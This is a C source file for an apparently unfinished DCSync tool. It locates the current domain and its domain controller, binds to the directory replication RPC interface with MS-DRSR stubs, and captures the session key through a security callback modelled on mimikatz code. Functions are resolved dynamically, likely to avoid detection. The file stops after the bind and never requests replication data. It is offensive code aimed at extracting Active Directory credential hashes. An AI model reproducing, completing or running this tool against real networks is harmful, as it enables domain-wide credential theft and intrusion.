#pragma once
#include "dcsync.h"
#include "gate.h"
#include "ms-drsr.h"

#include <stdio.h>
#include <windows.h>

extern const ms2Ddrsr_MIDL_TYPE_FORMAT_STRING ms2Ddrsr__MIDL_TypeFormatString;
extern const ms2Ddrsr_MIDL_PROC_FORMAT_STRING ms2Ddrsr__MIDL_ProcFormatString;

static RPC_BINDING_HANDLE drsuapi__MIDL_AutoBindHandle;
static const RPC_CLIENT_INTERFACE drsuapi___RpcClientInterface = {
    sizeof(RPC_CLIENT_INTERFACE),
    {{0xe3514235,
      0x4b06,
      0x11d1,
      {0xab, 0x04, 0x00, 0xc0, 0x4f, 0xc2, 0xdc, 0xd2}},
     {4, 0}},
    {{0x8a885d04,
      0x1ceb,
      0x11c9,
      {0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 0x48, 0x60}},
     {2, 0}},
    0,
    0,
    0,
    0,
    0,
    0x00000000};
static const MIDL_STUB_DESC drsuapi_c_StubDesc = {
    (void *)&drsuapi___RpcClientInterface,
    MIDL_user_allocate,
    MIDL_user_free,
    &drsuapi__MIDL_AutoBindHandle,
    0,
    0,
    0,
    0,
    ms2Ddrsr__MIDL_TypeFormatString.Format,
    1,
    0x60000,
    0,
    0x8000253,
    0,
    0,
    0,
    0x1,
    0,
    0,
    0};
ULONG IDL_DRSDomainControllerInfo(DRS_HANDLE hDrs, DWORD dwInVersion,
                                  DRS_MSG_DCINFOREQ *pmsgIn,
                                  DWORD *pdwOutVersion,
                                  DRS_MSG_DCINFOREPLY *pmsgOut) {
  return (ULONG)NdrClientCall2(
             (PMIDL_STUB_DESC)&drsuapi_c_StubDesc,
             (PFORMAT_STRING)&ms2Ddrsr__MIDL_ProcFormatString.Format[716], hDrs,
             dwInVersion, pmsgIn, pdwOutVersion, pmsgOut)
      .Simple;
}

typedef NTSTATUS(WINAPI *LsaClose_t)(_In_ LSA_HANDLE ObjectHandle);
GUID DRSUAPI_DS_BIND_GUID_Standard = {
    0xe24d201a,
    0x4fd6,
    0x11d1,
    {0xa3, 0xda, 0x00, 0x00, 0xf8, 0x75, 0xae, 0x0d}};

PPOLICY_DNS_DOMAIN_INFO GetCurrentDomain() {
  PPOLICY_DNS_DOMAIN_INFO Buffer = NULL;
  LSA_HANDLE lsaHandle;
  LSA_OBJECT_ATTRIBUTES oaLsa = {0};
  HMODULE advapi32 = LoadLibraryA("advapi32.dll");

  LsaQueryInformationPolicy_t LsaQueryInformationPolicy =
      (LsaQueryInformationPolicy_t)GetProcAddress(advapi32,
                                                  "LsaQueryInformationPolicy");
  LsaOpenPolicy_t LsaOpenPolicy =
      (LsaOpenPolicy_t)GetProcAddress(advapi32, "LsaOpenPolicy");
  LsaClose_t LsaClose = (LsaClose_t)GetProcAddress(advapi32, "LsaClose");
  NTSTATUS status =
      LsaOpenPolicy(NULL, &oaLsa, POLICY_VIEW_LOCAL_INFORMATION, &lsaHandle);
  if (status != 0) {
    printf("error opening policy.. 0x%lx\n", status);
    return Buffer;
  }

  status = LsaQueryInformationPolicy(lsaHandle, PolicyDnsDomainInformation,
                                     (PVOID *)&Buffer);
  if (status != 0) {
    printf("error querying policy.. 0x%lx\n", status);
    return Buffer;
  }
  LsaClose(lsaHandle);
  return Buffer;
}

LPWSTR getDC(LPCWSTR fullDomainName) {
  HMODULE netapi32 = LoadLibraryA("Netapi32.dll");
  DsGetDcNameW_t DsGetDcNameW =
      (DsGetDcNameW_t)GetProcAddress(netapi32, "DsGetDcNameW");
  LPWSTR fullDCName = NULL;
  DWORD altflags = DS_DIRECTORY_SERVICE_REQUIRED;
  DWORD ret;
  PDOMAIN_CONTROLLER_INFOW cInfo = NULL;

  ret = DsGetDcNameW(NULL, fullDomainName, NULL, NULL,
                     altflags | DS_IS_DNS_NAME | DS_RETURN_DNS_NAME, &cInfo);
  if (ret == ERROR_SUCCESS) {
    fullDCName = cInfo->DomainControllerName;
  } else {
    printf("failed to lookup: 0x%luX\n", ret);
  }
  return fullDCName;
}

char *ConvertLPCWSTRToChar(LPCWSTR wideStr) {
  // 1. Get required buffer size
  int bufferSize =
      WideCharToMultiByte(CP_UTF8, 0, wideStr, -1, NULL, 0, NULL, NULL);

  // 2. Allocate memory
  char *narrowStr = (char *)malloc(bufferSize);

  // 3. Perform conversion
  WideCharToMultiByte(CP_UTF8, 0, wideStr, -1, narrowStr, bufferSize, NULL,
                      NULL);

  return narrowStr;
}

BOOL Makebinding(LPCWSTR uuid, LPCWSTR ProtSeq, LPCWSTR NetworkAddr,
                 LPCWSTR Endpoint, LPCWSTR Service,
                 BOOL addServiceToNetworkAddr, DWORD AuthnSvc,
                 RPC_AUTH_IDENTITY_HANDLE hAuth, DWORD ImpersonationType,
                 RPC_BINDING_HANDLE *hBinding,
                 void(RPC_ENTRY *RpcSecurityCallback)(void *)) {
  BOOL status = FALSE;
  RPC_STATUS rpcStatus;
  // RPC_CSTR StringBinding = NULL;
  RPC_SECURITY_QOS SecurityQOS = {RPC_C_SECURITY_QOS_VERSION,
                                  RPC_C_QOS_CAPABILITIES_MUTUAL_AUTH,
                                  RPC_C_QOS_IDENTITY_STATIC, ImpersonationType};
  DWORD szServer, szPrefix;
  LPWSTR fullServer = NULL;
  *hBinding = NULL;
  RPC_WSTR StringBinding = NULL;
  rpcStatus = RpcStringBindingComposeW(
      (RPC_WSTR)uuid, (RPC_WSTR)ProtSeq, (RPC_WSTR)NetworkAddr,
      (RPC_WSTR)Endpoint, NULL, &StringBinding);

  if (rpcStatus != RPC_S_OK) {
    printf("failed to compose binding: 0x%lx\n", rpcStatus);
    return FALSE;
  }
  rpcStatus = RpcBindingFromStringBindingW(StringBinding, hBinding);
  if (rpcStatus != RPC_S_OK) {
    printf("failed to compose binding: 0x%lx\n", rpcStatus);
    return FALSE;
  }
  if (addServiceToNetworkAddr) {
    szServer = lstrlen(ConvertLPCWSTRToChar(NetworkAddr)) * sizeof(wchar_t);
    szPrefix = lstrlen(ConvertLPCWSTRToChar(Service)) * sizeof(wchar_t);
    fullServer = (LPWSTR)LocalAlloc(LPTR, szPrefix + sizeof(wchar_t) +
                                              szServer + sizeof(wchar_t));
    if (fullServer) {
      RtlCopyMemory(fullServer, Service, szPrefix);
      RtlCopyMemory((PBYTE)fullServer + szPrefix + sizeof(wchar_t), NetworkAddr,
                    szServer);
      ((PBYTE)fullServer)[szPrefix] = L'/';
    }
  }
  if (!addServiceToNetworkAddr || fullServer) {
    rpcStatus = RpcBindingSetAuthInfoEx(
        *hBinding, (RPC_CSTR)(fullServer ? fullServer : Service),
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY, AuthnSvc, hAuth, RPC_C_AUTHZ_NONE,
        &SecurityQOS);
    if (rpcStatus == RPC_S_OK) {
      if (RpcSecurityCallback) {
        rpcStatus = RpcBindingSetOption(*hBinding, RPC_C_OPT_SECURITY_CALLBACK,
                                        (ULONG_PTR)RpcSecurityCallback);
        status = (rpcStatus == RPC_S_OK);
        if (!status)
          wprintf(L"RpcBindingSetOption: 0x%08x (%u)\n", rpcStatus, rpcStatus);
      } else {
        status = TRUE;
      }
    }
  }

  return status;
}
SecPkgContext_SessionKey kull_m_rpc_drsr_g_sKey = {0, NULL};

void RPC_ENTRY RpcSecurityCallback(void *Context) {
  HMODULE secure32 = GetModuleHandle("secur32.dll");
  QueryContextAttributes_t QueryContextAttributes =
      (QueryContextAttributes_t)GetProcAddress(secure32,
                                               "QueryContextAttributes");
  RPC_STATUS rpcStatus;
  SECURITY_STATUS secStatus;
  PCtxtHandle data = NULL;
  rpcStatus = I_RpcBindingInqSecurityContext(Context, (LPVOID *)&data);
  if (rpcStatus != RPC_S_OK) {
    printf("error binding security context: 0x%lx\n", rpcStatus);
    return;
  }
  if (!data) {
    printf("data is NULL after InqSecurityContext\n");
    return;
  }
  if (kull_m_rpc_drsr_g_sKey.SessionKey) {
    // FreeContextBuffer(kull_m_rpc_drsr_g_sKey.SessionKey);
    kull_m_rpc_drsr_g_sKey.SessionKeyLength = 0;
    kull_m_rpc_drsr_g_sKey.SessionKey = NULL;
  }
  secStatus = QueryContextAttributes(data, SECPKG_ATTR_SESSION_KEY,
                                     (LPVOID)&kull_m_rpc_drsr_g_sKey);
  if (secStatus != SEC_E_OK) {
    printf("error querying context attributes: 0x%lx\n", secStatus);
    return;
  }
}

ULONG IDL_DRSBind(handle_t rpc_handle, UUID *puuidClientDsa,
                  DRS_EXTENSIONS *pextClient, DRS_EXTENSIONS **ppextServer,
                  DRS_HANDLE *phDrs) {
  return (ULONG)NdrClientCall2(
             (PMIDL_STUB_DESC)&drsuapi_c_StubDesc,
             (PFORMAT_STRING)&ms2Ddrsr__MIDL_ProcFormatString.Format[0],
             rpc_handle, puuidClientDsa, pextClient, ppextServer, phDrs)
      .Simple;
}

BOOL getDCBind(RPC_BINDING_HANDLE *hBinding, GUID *NtdsDsaObjectGuid,
               DRS_HANDLE *hDrs, DRS_EXTENSIONS_INT *pDrsExtensionsInt) {

  printf("hBinding: %p\n", hBinding);
  printf("*hBinding: %p\n", *hBinding);
  printf("NtdsDsaObjectGuid: %p\n", NtdsDsaObjectGuid);
  printf("hDrs: %p\n", hDrs);
  printf("pDrsExtensionsInt: %p\n", pDrsExtensionsInt);
  BOOL status = FALSE;
  ULONG drsStatus;
  DRS_EXTENSIONS_INT *pDrsExtensionsOutput = NULL;
  drsStatus = IDL_DRSBind(*hBinding, NtdsDsaObjectGuid,
                          (DRS_EXTENSIONS *)pDrsExtensionsInt,
                          (DRS_EXTENSIONS **)&pDrsExtensionsOutput, hDrs);

  printf("drsStatus: 0x%lx\n", drsStatus);
  printf("pDrsExtensionsOutput: %p\n", pDrsExtensionsOutput);
  printf("hDrs after bind: %p\n", *hDrs);

  if (drsStatus != 0) {
    printf("failed status: 0x%lx", drsStatus);
    return status;
  }
  if (!pDrsExtensionsOutput) {
    printf("pDrsExtensionsOutput is NULL\n");
    return FALSE;
  }

  if (pDrsExtensionsOutput->dwFlags &
      (DRS_EXT_GETCHGREQ_V8 | DRS_EXT_STRONG_ENCRYPTION)) {
    status = TRUE;
  }
  pDrsExtensionsInt->SiteObjGuid = pDrsExtensionsOutput->SiteObjGuid;
  pDrsExtensionsInt->dwReplEpoch = pDrsExtensionsOutput->dwReplEpoch;
  pDrsExtensionsInt->dwExtCaps = MAXDWORD32;
  pDrsExtensionsInt->ConfigObjGUID = pDrsExtensionsOutput->ConfigObjGUID;

  return status;
}

BOOL getDomainAndUserInfo(RPC_BINDING_HANDLE *hBinding, LPCWSTR ServerName,
                          LPCWSTR Domain, GUID *DomainGUID, LPCWSTR User,
                          LPCWSTR Guid, GUID *UserGuid,
                          DRS_EXTENSIONS_INT *pDrsExtensionsInt) {

  BOOL status = FALSE, DomainGUIDfound = FALSE, ObjectGUIDfound = FALSE;
  DWORD i;
  ULONG drsStatus;
  DRS_HANDLE hDrs = NULL;
  DRS_MSG_DCINFOREQ dcInfoReq = {0};
  DWORD dcOutVersion = 0;
  DRS_MSG_DCINFOREPLY dcInfoRep = {0};
  LPWSTR sGuid;
  LPWSTR sSid;
  LPWSTR sTempDomain;
  PSID pSid;
  UNICODE_STRING uGuid;
  RtlZeroMemory(pDrsExtensionsInt, sizeof(DRS_EXTENSIONS_INT));
  pDrsExtensionsInt->cb = sizeof(DRS_EXTENSIONS_INT) - sizeof(DWORD);
  pDrsExtensionsInt->dwFlags =
      DRS_EXT_GETCHGREPLY_V6 | DRS_EXT_STRONG_ENCRYPTION;
  status = getDCBind(hBinding, &DRSUAPI_DS_BIND_GUID_Standard, &hDrs,
                     pDrsExtensionsInt);
  if (!status) {
    return status;
  }
  dcInfoReq.V1.InfoLevel = 2;
  dcInfoReq.V1.Domain = (LPWSTR)Domain;
  drsStatus = IDL_DRSDomainControllerInfo(hDrs, 1, &dcInfoReq, &dcOutVersion,
                                          &dcInfoRep);
  if (drsStatus != 0) {
    printf("Failed to get domain controller info: 0x%lx\n", drsStatus);
    return status;
  }
  for (i = 0; i < dcInfoRep.V2.cItems; i++) {
    if (!DomainGUIDfound &&
        ((_wcsicmp(ServerName, dcInfoRep.V2.rItems[i].DnsHostName) == 0) ||
         (_wcsicmp(ServerName, dcInfoRep.V2.rItems[i].NetbiosName) == 0))) {
      DomainGUIDfound = TRUE;
      *DomainGUID = dcInfoRep.V2.rItems[i].NtdsDsaObjectGuid;
    }
  }

  return status;
}

void dcsync() {
  size_t ntdll = get_mod_base("ntdll.dll");
  RtlGetNtVersionNumbers_t RtlGetNtVersionNumbers =
      (RtlGetNtVersionNumbers_t)get_function_from_exports(
          ntdll, "RtlGetNtVersionNumbers");
  if (!RtlGetNtVersionNumbers) {
    printf("cannot find function...\n");
    return;
  }
  LPCWSTR szUser, szGuid;
  LPCWSTR szDomain = NULL, szDc = NULL, szService = NULL;
  DSNAME dsName = {0};
  ULONG pMajor, pMinor, pBuild;
  PPOLICY_DNS_DOMAIN_INFO pDomainInfo = NULL;
  RPC_BINDING_HANDLE hBinding;
  DRS_MSG_GETCHGREQ getChReq = {0};
  DRS_MSG_GETCHGREPLY getChRep = {0};
  DRS_EXTENSIONS_INT DrsExtensionsInt = {0};
  DRS_HANDLE hDrs = NULL;
  DWORD i, dwOutVersion = 0;
  ULONG drsStatus;
  pDomainInfo = GetCurrentDomain();
  szDomain = pDomainInfo->DnsDomainName.Buffer;
  szDc = getDC(szDomain);
  while (*szDc == L'\\')
    szDc++;
  szService = L"ldap";
  RtlGetNtVersionNumbers(&pMajor, &pMinor, &pBuild);
  Makebinding(NULL, L"ncacn_ip_tcp", szDc, NULL, szService, TRUE,
              (pMajor < 6) ? RPC_C_AUTHN_GSS_KERBEROS
                           : RPC_C_AUTHN_GSS_NEGOTIATE,
              NULL, RPC_C_IMP_LEVEL_DEFAULT, &hBinding, RpcSecurityCallback);
  printf("made binding...\n");

  DrsExtensionsInt.cb = sizeof(DRS_EXTENSIONS_INT) - sizeof(DWORD);
  DrsExtensionsInt.dwFlags = DRS_EXT_GETCHGREQ_V8 | DRS_EXT_STRONG_ENCRYPTION;

  BOOL status = getDCBind(&hBinding, &getChReq.V8.uuidDsaObjDest, &hDrs,
                          &DrsExtensionsInt);
  printf("got dc bind!\n");
}
